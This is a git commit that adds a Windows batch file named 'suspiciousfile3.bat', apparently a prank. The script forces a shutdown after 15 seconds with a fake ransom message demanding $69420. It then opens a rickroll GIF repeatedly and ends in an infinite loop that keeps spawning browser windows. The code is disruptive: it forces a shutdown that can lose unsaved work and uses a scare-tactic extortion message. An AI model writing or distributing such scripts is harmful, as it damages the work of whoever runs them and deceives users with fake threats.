1d8f6ba56680d60f688658e3113bad09008078d1
Andy Jiang <andyjiang9999@gmail.com>
2022-07-21 18:19:31 +1000

    ultimate suspicious file

---
+++ team/suspiciousfile3.bat
@@ -0,0 +1,16 @@
+shutdown -s -f -t 15 -c "You have downloded a virus If you not pay $69420 in 5 seconds you computer will self-destract"
+start https://c.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif
+timeout 1
+start https://c.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif
+timeout 1
+start https://c.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif
+timeout 1
+start https://c.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif
+timeout 1
+start https://c.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif
+timeout 1
+start https://c.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif
+timeout 1
+:a
+start https://c.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif
+goto a
